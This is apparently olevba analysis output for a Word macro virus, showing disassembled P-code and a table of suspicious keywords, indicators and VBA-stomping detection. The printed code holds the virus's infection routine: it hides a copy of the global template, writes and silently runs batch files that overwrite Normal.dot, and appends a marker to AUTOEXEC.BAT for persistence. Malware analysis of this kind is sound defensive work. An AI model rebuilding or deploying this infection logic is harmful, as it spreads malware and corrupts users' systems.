' 	Ld nday 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #357:
' 	LineCont 0x0008 0B 00 05 00 17 00 05 00
' 	LitStr 0x0028 "MAAYONG PASKO UG MALIPAYONG BAG-ONG TUIG"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000F "KANINYONG TANAN"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Gikan ni: JHOSOL"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0011 "Hacker's Greeting"
' 	ArgsLd MsgBox 0x0003 
' 	St X 
' Line #358:
' 	EndIfBlock 
' Line #359:
' 	Ld nmth 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld nday 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #360:
' 	LineCont 0x0004 10 00 05 00
' 	LitStr 0x0014 "HAPPY VALENTINES DAY"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "From: JHOSOL"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0011 "Hacker's Greeting"
' 	ArgsLd MsgBox 0x0003 
' 	St X 
' Line #361:
' 	EndIfBlock 
' Line #362:
' 	ArgsLd hasmarker 0x0000 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #363:
' 	ArgsCall (Call) CreateLoader 0x0000 
' Line #364:
' 	EndIfBlock 
' Line #365:
' 	EndSub 
' Line #366:
' Line #367:
' 	FuncDefn (Sub CreateLoader())
' Line #368:
' 	OnError (Resume Next) 
' Line #369:
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	St scode 
' Line #370:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set aDoc 
' Line #371:
' 	StartWithExpr 
' 	Ld aDoc 
' 	With 
' Line #372:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\nt.txt"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0002 
' Line #373:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	ArgsMemCallWith Close 0x0001 
' Line #374:
' 	EndWith 
' Line #375:
' Line #376:
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	St scode 
' Line #377:
' 	LitStr 0x0018 "C:\WINDOWS\COMMAND\t.bat"
' 	St batchfle$ 
' Line #378:
' 	Ld Friend 
' 	St fNmbr 
' Line #379:
' 	Ld batchfle$ 
' 	Ld fNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #380:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #381:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "if exist C:\WINDOWS\COMMAND\nt.txt ATTRIB C:\WINDOWS\COMMAND\nt.txt -H -R > NUL"
' 	PrintItemNL 
' Line #382:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "COPY C:\WINDOWS\COMMAND\nt.txt C:\PROGRA~1\MICROS~1\TEMPLA~1\Normal.dot /Y > NUL"
' 	PrintItemNL 
' Line #383:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "if exist C:\WINDOWS\COMMAND\nt.txt ATTRIB C:\WINDOWS\COMMAND\nt.txt +H +R > NUL"
' 	PrintItemNL 
' Line #384:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "if exist c:\windows\command\tmp.bat del c:\windows\command\tmp.bat > nul"
' 	PrintItemNL 
' Line #385:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0044 "if exist c:\windows\command\t.bat del c:\windows\command\t.bat > nul"
' 	PrintItemNL 
' Line #386:
' 	Ld fNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #387:
' Line #388:
' 	LitStr 0x001A "C:\windows\command\tmp.bat"
' 	St tmpfle$ 
' Line #389:
' 	Ld Friend 
' 	St fNmbr 
' Line #390:
' 	Ld tmpfle$ 
' 	Ld fNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #391:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "rename c:\windows\command\t.bat "
' 	Ld scode 
' 	Concat 
' 	LitStr 0x000A ".bat > nul"
' 	Concat 
' 	PrintItemNL 
' Line #392:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "ATTRIB C:\WINDOWS\COMMAND\nt.txt +H +R > NUL"
' 	PrintItemNL 
' Line #393:
' 	Ld fNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #394:
' 	LitStr 0x0029 "command.com /c c:\windows\command\tmp.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #395:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	St autofle$ 
' Line #396:
' 	Ld Friend 
' 	St fNmbr 
' Line #397:
' 	Ld autofle$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #398:
' 	Ld autofle$ 
' 	Ld fNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #399:
' 	Ld fNmbr 
' 	Sharp 
' 	PrintChan 
' 	Ld scode 
' 	PrintItemNL 
' Line #400:
' 	Ld fNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #401:
' 	EndSub 
' Line #402:
' Line #403:
' 	FuncDefn (Function hasmarker())
' Line #404:
' 	OnError (Resume Next) 
' Line #405:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #406:
' 	ArgsCall (Call) mkautof 0x0000 
' Line #407:
' 	EndIfBlock 
' Line #408:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	St autofle$ 
' Line #409:
' 	Ld Friend 
' 	St hNmbr 
' Line #410:
' 	Dim 
' 	VarDefn InputData
' 	VarDefn ShowLine
' Line #411:
' 	Ld autofle$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #412:
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	St fMarker 
' Line #413:
' 	LitVarSpecial (False)
' 	St hasmarker 
' Line #414:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #415:
' 	Ld hNmbr 
' 	Ld InputData 
' 	LineInput 
' Line #416:
' 	Ld InputData 
' 	Ld fMarker 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St hasmarker 
' 	EndIf 
' Line #417:
' 	Loop 
' Line #418:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #419:
' 	EndFunc 
' Line #420:
' Line #421:
' 	FuncDefn (Sub mkautof())
' Line #422:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St autofle$ 
' Line #423:
' 	Ld Friend 
' 	St hNmbr 
' Line #424:
' 	Ld autofle$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #425:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #426:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "PROMPT $P$G"
' 	PrintItemNL 
' Line #427:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "SET PATH=C:\WINDOWS;C:\WINDOWS\COMMAND"
' 	PrintItemNL 
' Line #428:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #429:
' 	EndSub 
' Line #430:
' Line #431:
' 	FuncDefn (Function getcode())
' Line #432:
' 	Ld Timer 
' 	SelectCase 
' Line #433:
' 	LitDI2 0x7082 
' 	LitDI2 0x7404 
' 	CaseTo 
' 	CaseDone 
' Line #434:
' 	LitDI2 0x0001 
' 	St getcode 
' Line #435:
' 	LitDI2 0x7405 
' 	LitDI2 0x7789 
' 	CaseTo 
' 	CaseDone 
' Line #436:
' 	LitDI2 0x0002 
' 	St getcode 
' Line #437:
' 	LitDI2 0x778A 
' 	LitDI2 0x7B0D 
' 	CaseTo 
' 	CaseDone 
' Line #438:
' 	LitDI2 0x0003 
' 	St getcode 
' Line #439:
' 	LitDI2 0x7B0E 
' 	LitDI2 0x7E90 
' 	CaseTo 
' 	CaseDone 
' Line #440:
' 	LitDI2 0x0004 
' 	St getcode 
' Line #441:
' 	LitDI2 0x7E91 
' 	LitDI4 0x8214 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #442:
' 	LitDI2 0x0005 
' 	St getcode 
' Line #443:
' 	LitDI4 0x8215 0x0000 
' 	LitDI4 0x8598 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #444:
' 	LitDI2 0x0006 
' 	St getcode 
' Line #445:
' 	LitDI4 0x8599 0x0000 
' 	LitDI4 0x891C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #446:
' 	LitDI2 0x0007 
' 	St getcode 
' Line #447:
' 	LitDI4 0x891D 0x0000 
' 	LitDI4 0x8CA0 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #448:
' 	LitDI2 0x0008 
' 	St getcode 
' Line #449:
' 	LitDI4 0x8CA1 0x0000 
' 	LitDI4 0x9024 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #450:
' 	LitDI2 0x0009 
' 	St getcode 
' Line #451:
' 	LitDI4 0x9025 0x0000 
' 	LitDI4 0x93A8 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #452:
' 	LitDI2 0x000A 
' 	St getcode 
' Line #453:
' 	LitDI4 0x93A9 0x0000 
' 	LitDI4 0x972C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #454:
' 	LitDI2 0x000B 
' 	St getcode 
' Line #455:
' 	LitDI4 0x972D 0x0000 
' 	LitDI4 0x9AB0 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #456:
' 	LitDI2 0x000C 
' 	St getcode 
' Line #457:
' 	LitDI4 0x9AB1 0x0000 
' 	LitDI4 0x9E34 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #458:
' 	LitDI2 0x000D 
' 	St getcode 
' Line #459:
' 	LitDI4 0x9E35 0x0000 
' 	LitDI4 0xA1B8 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #460:
' 	LitDI2 0x000E 
' 	St getcode 
' Line #461:
' 	LitDI4 0xA1B9 0x0000 
' 	LitDI4 0xA53C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #462:
' 	LitDI2 0x000F 
' 	St getcode 
' Line #463:
' 	LitDI4 0xA53D 0x0000 
' 	LitDI4 0xA8C0 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #464:
' 	LitDI2 0x0010 
' 	St getcode 
' Line #465:
' 	LitDI4 0xA8C1 0x0000 
' 	LitDI4 0xAC44 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #466:
' 	LitDI2 0x0011 
' 	St getcode 
' Line #467:
' 	LitDI4 0xAC45 0x0000 
' 	LitDI4 0xAFC8 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #468:
' 	LitDI2 0x0012 
' 	St getcode 
' Line #469:
' 	LitDI4 0xAFC9 0x0000 
' 	LitDI4 0xB34C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #470:
' 	LitDI2 0x0013 
' 	St getcode 
' Line #471:
' 	LitDI4 0xB34D 0x0000 
' 	LitDI4 0xB6D0 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #472:
' 	LitDI2 0x0014 
' 	St getcode 
' Line #473:
' 	LitDI4 0xB6D1 0x0000 
' 	LitDI4 0xBA54 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #474:
' 	LitDI2 0x0015 
' 	St getcode 
' Line #475:
' 	LitDI4 0xBA55 0x0000 
' 	LitDI4 0xBDD8 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #476:
' 	LitDI2 0x0016 
' 	St getcode 
' Line #477:
' 	LitDI4 0xBDD9 0x0000 
' 	LitDI4 0xC15C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #478:
' 	LitDI2 0x0017 
' 	St getcode 
' Line #479:
' 	LitDI4 0xC15D 0x0000 
' 	LitDI4 0xC4E0 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #480:
' 	LitDI2 0x0018 
' 	St getcode 
' Line #481:
' 	LitDI4 0xC4E1 0x0000 
' 	LitDI4 0xC864 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #482:
' 	LitDI2 0x0019 
' 	St getcode 
' Line #483:
' 	LitDI4 0xC865 0x0000 
' 	LitDI4 0xCBE8 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #484:
' 	LitDI2 0x001A 
' 	St getcode 
' Line #485:
' 	LitDI4 0xCBE9 0x0000 
' 	LitDI4 0xCF6C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #486:
' 	LitDI2 0x001B 
' 	St getcode 
' Line #487:
' 	LitDI4 0xCF6D 0x0000 
' 	LitDI4 0xD2F0 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #488:
' 	LitDI2 0x001C 
' 	St getcode 
' Line #489:
' 	LitDI4 0xD2F1 0x0000 
' 	LitDI4 0xD674 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #490:
' 	LitDI2 0x001D 
' 	St getcode 
' Line #491:
' 	LitDI4 0xD675 0x0000 
' 	LitDI4 0xD9F8 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #492:
' 	LitDI2 0x001E 
' 	St getcode 
' Line #493:
' 	LitDI4 0xD9F9 0x0000 
' 	LitDI4 0xDD7C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #494:
' 	LitDI2 0x001F 
' 	St getcode 
' Line #495:
' 	LitDI4 0xDD7D 0x0000 
' 	LitDI4 0xE100 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #496:
' 	LitDI2 0x0020 
' 	St getcode 
' Line #497:
' 	LitDI4 0xE101 0x0000 
' 	LitDI4 0xE484 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #498:
' 	LitDI2 0x0021 
' 	St getcode 
' Line #499:
' 	LitDI4 0xE485 0x0000 
' 	LitDI4 0xE808 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #500:
' 	LitDI2 0x0022 
' 	St getcode 
' Line #501:
' 	LitDI4 0xE809 0x0000 
' 	LitDI4 0xEB8C 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #502:
' 	LitDI2 0x0023 
' 	St getcode 
' Line #503:
' 	LitDI4 0xEB8D 0x0000 
' 	LitDI4 0xEF10 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #504:
' 	LitDI2 0x0024 
' 	St getcode 
' Line #505:
' 	LitDI4 0xEF11 0x0000 
' 	LitDI4 0xF294 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #506:
' 	LitDI2 0x0025 
' 	St getcode 
' Line #507:
' 	LitDI4 0xF295 0x0000 
' 	LitDI4 0xF618 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #508:
' 	LitDI2 0x0026 
' 	St getcode 
' Line #509:
' 	LitDI4 0xF619 0x0000 
' 	LitDI4 0xF99D 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #510:
' 	LitDI2 0x0027 
' 	St getcode 
' Line #511:
' 	LitDI4 0xF99E 0x0000 
' 	LitDI4 0xFD20 0x0000 
' 	CaseTo 
' 	CaseDone 
' Line #512:
' 	LitDI2 0x0028 
' 	St getcode 
' Line #513:
' 	LitDI4 0xFD21 0x0000 
' 	LitDI4 0x00A4 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #514:
' 	LitDI2 0x0029 
' 	St getcode 
' Line #515:
' 	LitDI4 0x00A5 0x0001 
' 	LitDI4 0x0428 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #516:
' 	LitDI2 0x002A 
' 	St getcode 
' Line #517:
' 	LitDI4 0x0429 0x0001 
' 	LitDI4 0x07AC 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #518:
' 	LitDI2 0x002B 
' 	St getcode 
' Line #519:
' 	LitDI4 0x07AD 0x0001 
' 	LitDI4 0x0B30 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #520:
' 	LitDI2 0x002C 
' 	St getcode 
' Line #521:
' 	LitDI4 0x0B31 0x0001 
' 	LitDI4 0x0EB4 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #522:
' 	LitDI2 0x002D 
' 	St getcode 
' Line #523:
' 	LitDI4 0x0EB5 0x0001 
' 	LitDI4 0x1238 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #524:
' 	LitDI2 0x002E 
' 	St getcode 
' Line #525:
' 	LitDI4 0x1239 0x0001 
' 	LitDI4 0x1940 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #526:
' 	LitDI2 0x002F 
' 	St getcode 
' Line #527:
' 	LitDI4 0x1941 0x0001 
' 	LitDI4 0x2750 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #528:
' 	LitDI2 0x0030 
' 	St getcode 
' Line #529:
' 	LitDI4 0x2751 0x0001 
' 	LitDI4 0x3561 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #530:
' 	LitDI2 0x0031 
' 	St getcode 
' Line #531:
' 	LitDI4 0x3562 0x0001 
' 	LitDI4 0x4370 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #532:
' 	LitDI2 0x0032 
' 	St getcode 
' Line #533:
' 	LitDI4 0x4371 0x0001 
' 	LitDI4 0x5144 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #534:
' 	LitDI2 0x0033 
' 	St getcode 
' Line #535:
' 	LitDI4 0x5145 0x0001 
' 	LitDI4 0x869F 0x0001 
' 	CaseTo 
' 	CaseDone 
' Line #536:
' 	LitDI2 0x0034 
' 	St getcode 
' Line #537:
' 	CaseElse 
' Line #538:
' 	LitDI2 0x0064 
' 	St getcode 
' Line #539:
' 	EndSelect 
' Line #540:
' 	EndFunc 
' Line #541:
' Line #542:
' Line #543:
' Line #544:
' Line #545:
' Line #546:
' Line #547:
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' Line #552:
' Line #553:
' Line #554:
' Line #555:
' Line #556:
' Line #557:
' Line #558:
' Line #559:
' Line #560:
' Line #561:
' Line #562:
' Line #563:
' Line #564:
' Line #565:
' Line #566:
' Line #567:
' Line #568:
' Line #569:
' Line #570:
' Line #571:
' Line #572:
' Line #573:
' Line #574:
' Line #575:
' Line #576:
' Line #577:
' Line #578:
' Line #579:
' Line #580:
' Line #581:
' Line #582:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |rerolpxe.exe        |Executable file name                         |
|IOC       |dplay.dll           |Executable file name                         |
|IOC       |yalpd.dll           |Executable file name                         |
|IOC       |dplayx.dll          |Executable file name                         |
|IOC       |xyalpd.dll          |Executable file name                         |
|IOC       |sage.dll            |Executable file name                         |
|IOC       |egas.dll            |Executable file name                         |
|IOC       |comdlg32.dll        |Executable file name                         |
|IOC       |23gldmoc.dll        |Executable file name                         |
|IOC       |t.bat               |Executable file name                         |
|IOC       |tmp.bat             |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

